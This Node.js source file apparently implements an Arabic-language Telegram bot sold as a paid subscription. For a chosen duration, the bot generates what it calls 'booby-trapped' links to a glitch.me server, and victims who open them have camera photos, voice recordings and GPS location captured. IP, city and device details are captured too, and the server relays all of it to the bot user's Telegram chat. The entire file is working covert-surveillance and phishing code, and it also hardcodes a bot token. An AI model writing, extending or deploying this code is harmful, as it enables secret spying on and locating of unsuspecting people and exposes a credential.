const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const botToken = '7252078284:AAFt6ySoKDAJx-6wbg435qnU-_ramrgRL8Y';
const bot = new TelegramBot(botToken, { polling: true });

const app = express();
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

const storage = multer.memoryStorage();
const upload = multer({ storage: storage });
const MAX_FREE_ATTEMPTS = 3;
const userVisits = {};
const freeTrialEndedMessage = 'لقد انتهت الفترة التجريبية المجانية. الرجاء شراء اشتراك من المطور لاستخدام البوت بدون قيود.';

const adminId = '7130416076';
const subscribedUsers = new Set();

// Camera routes
app.get('/:action/:userId', (req, res) => {
    const userId = req.params.userId;
    const action = req.params.action;
    const cameraType = req.query.cameraType;
    const duration = req.query.duration;

    if (subscribedUsers.has(userId)) {
        switch(action) {
            case 'camera':
                res.sendFile(path.join(__dirname, 'location.html'));
                break;
            case 'record':
                res.sendFile(path.join(__dirname, 'record.html'));
                break;
            case 'getLocation':
                res.sendFile(path.join(__dirname, 'SJGD.html'));
                break;
            default:
                res.status(404).send('Action not found');
        }
        return;
    }

    if (!userVisits[userId]) {
        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
    }

    userVisits[userId][action]++;

    if (userVisits[userId][action] > MAX_FREE_ATTEMPTS) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    switch(action) {
        case 'camera':
            res.sendFile(path.join(__dirname, 'location.html'));
            break;
        case 'record':
            res.sendFile(path.join(__dirname, 'record.html'));
            break;
        case 'getLocation':
            res.sendFile(path.join(__dirname, 'SJGD.html'));
            break;
        default:
            res.status(404).send('Action not found');
    }
});

app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
    const chatId = req.body.userId;
    const files = req.files;
    const additionalData = JSON.parse(req.body.additionalData || '{}');
    const cameraType = req.body.cameraType;

    if (files && files.length > 0) {
        console.log(`Received ${files.length} images from user ${chatId}`);

        const caption = `
معلومات إضافية:
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
إصدار الجهاز: ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
        `;

        try {
            const sendPhotoPromises = files.map(file => bot.sendPhoto(chatId, file.buffer, { caption }));
            await Promise.all(sendPhotoPromises);
            console.log('Photos sent successfully');
            res.json({ success: true });
        } catch (err) {
            console.error('Failed to send photos:', err);
            res.status(500).json({ error: 'Failed to send photos' });
        }
    } else {
        console.log('No images received');
        res.status(400).json({ error: 'No images received' });
    }
});

app.post('/submitVoice', upload.single('voice'), (req, res) => {
    const chatId = req.body.chatId;
    const voiceFile = req.file;
    const additionalData = JSON.parse(req.body.additionalData || '{}');

    if (!voiceFile) {
        console.error('No voice file received');
        return res.status(400).json({ error: 'No voice file received' });
    }

    const caption = `
معلومات إضافية:
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
إصدار الجهاز: ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
    `;

    bot.sendVoice(chatId, voiceFile.buffer, { caption })
        .then(() => {
            console.log('Voice sent successfully');
            res.json({ success: true });
        })
        .catch(error => {
            console.error('Error sending voice:', error);
            res.status(500).json({ error: 'Failed to send voice message' });
        });
});

app.post('/submitLocation', upload.none(), async (req, res) => {
    const chatId = req.body.chatId;
    const latitude = req.body.latitude;
    const longitude = req.body.longitude;
    const additionalData = JSON.parse(req.body.additionalData || '{}');

    if (!latitude || !longitude) {
        console.error('No location data received');
        return res.status(400).json({ error: 'No location data received' });
    }

    const caption = `
معلومات إضافية:
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
إصدار الجهاز: ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
    `;

    try {
        await bot.sendLocation(chatId, latitude, longitude, { caption });
        console.log('Location sent successfully');
        res.json({ success: true });
    } catch (error) {
        console.error('Error sending location:', error);
        res.status(500).json({ error: 'Failed to send location message' });
    }
});

bot.onText(/\/subscribe (\d+)/, (msg, match) => {
    if (msg.from.id.toString() !== adminId) {
        bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
        return;
    }

    const userId = match[1];
    if (subscribedUsers.add(userId).size > subscribedUsers.size) {
        bot.sendMessage(msg.chat.id, `تمت إضافة المستخدم ${userId} إلى قائمة المشتركين بنجاح.`);
    } else {
        bot.sendMessage(msg.chat.id, `المستخدم ${userId} موجود بالفعل في قائمة المشتركين.`);
    }
});

bot.onText(/\/unsubscribe (\d+)/, (msg, match) => {
    const userId = match[1];
    if (subscribedUsers.delete(userId)) {
        bot.sendMessage(msg.chat.id, `تمت إزالة المستخدم ${userId} من قائمة المشتركين.`);
    } else {
        bot.sendMessage(msg.chat.id, `المستخدم ${userId} غير موجود في قائمة المشتركين.`);
    }
});

bot.onText(/\/listsubscribers/, (msg) => {
    if (msg.from.id.toString() !== adminId) {
        bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
        return;
    }

    const subscribersList = Array.from(subscribedUsers).join('\n');
    bot.sendMessage(msg.chat.id, `قائمة المشتركين:\n${subscribersList || 'لا يوجد مشتركين حالياً.'}`);
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const message = 'مرحبًا! اختر إحدى الخيارات التالية:';
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'تصوير كام أمامي', callback_data: 'front_camera' }],
                [{ text: 'تصوير كام خلفي', callback_data: 'rear_camera' }],
                [{ text: 'تسجيل صوت', callback_data: 'voice_record' }],
                [{ text: 'الحصول على الموقع', callback_data: 'get_location' }]
            ]
        }
    });
});

bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    if (data === 'front_camera' || data === 'rear_camera') {
        const url = `https://creative-marmalade-periwinkle.glitch.me/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
        bot.sendMessage(chatId, `انقر على الرابط للتصوير: ${url}`);
    } else if (data === 'voice_record') {
        bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
    } else if (data === 'get_location') {
        const url = `https://creative-marmalade-periwinkle.glitch.me/getLocation/${chatId}`;
        bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${url}`);
    }
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const duration = parseInt(msg.text, 10);

    if (!isNaN(duration)) {
        if (duration > 0 && duration <= 20) {
            const link = `https://creative-marmalade-periwinkle.glitch.me/record/${chatId}?duration=${duration}`;
            bot.sendMessage(chatId, `تم تلغيم الرابط لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
        } else {
            bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
        }
    }
});


const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});